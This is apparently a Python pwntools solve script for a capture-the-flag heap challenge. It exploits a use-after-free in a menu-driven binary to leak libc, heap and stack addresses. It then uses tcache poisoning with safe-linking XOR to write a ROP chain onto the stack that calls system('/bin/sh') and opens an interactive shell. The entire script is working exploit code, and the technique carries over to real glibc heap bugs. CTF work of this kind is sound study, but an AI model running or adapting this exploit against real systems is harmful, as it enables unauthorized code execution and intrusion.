#!/usr/bin/env python3
from pwn import *

exe=ELF("./chall")

libc = exe.libc
#if args.REMOTE:
#    libc = ELF("./libc.so.6")

HOST, PORT = "127.0.0.1","1337"

context.binary = exe

# Constants

GDBSCRIPT = '''\
b* main+128
c
'''
CHECKING = True

def receive():
    return io.recvuntil(b"choice: ")

def create(index,size):
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    io.recvuntil(b": ")
    io.sendline(str(size).encode())
    return receive()

def delete(index):
    io.sendline(b"2")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    return receive()

def show(index):
    io.sendline(b"3")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    return receive()

def edit(index,content):
    io.sendline(b"4")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    io.recvuntil(b": ")
    io.sendline(content)
    return receive()

def main():
    global io
    io = conn()
    
    receive()
    
    
    create(0,0x500)
    create(1,0x10)
    
    delete(0)
    
    data = show(0).split(b"Content: ")[1]
    
    libc.address = leak(data[:0x8],0x21ace0,"libc",True)
    
    create(0,0x500)
    create(0,0x20)
    create(1,0x20)
    
    delete(0)
    
    data = show(0).split(b"Content: ")[1]
    heap_base = leak(data[:0x8],0,"heap",True)
    
    create(0,0x20)
    
    create(0,0x50)
    create(1,0x50)
    create(2,0x50)
    
    delete(0)
    delete(1)

    payload = p64(libc.symbols['environ']^heap_base)
    
    edit(1,payload)
    
    create(0,0x50)
    create(0,0x50)
    
    data = show(0).split(b"Content: ")[1]
    stack_base = leak(data[:0x8],0x120,"stack",True)
    
    create(0,0x60)
    create(1,0x60)
    create(2,0x60)
    
    delete(0)
    delete(1)
    
    payload = p64((stack_base-0x8)^heap_base)

    edit(1,payload)
        
    create(0,0x60)
    create(0,0x60)
    
    roplibc = ROP(libc)
    
    pop_rdi = roplibc.find_gadget(['pop rdi','ret']).address
    ret = roplibc.find_gadget(['ret']).address
    bin_sh = next(libc.search(b"/bin/sh\0"))
    
    payload = flat(
        ret, # dummy
        pop_rdi,
        bin_sh,
        ret,
        libc.symbols['system']
    )
    
    edit(0,payload)
    
    io.sendline(b"5") #exit
    
    io.interactive()
    
    
    

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
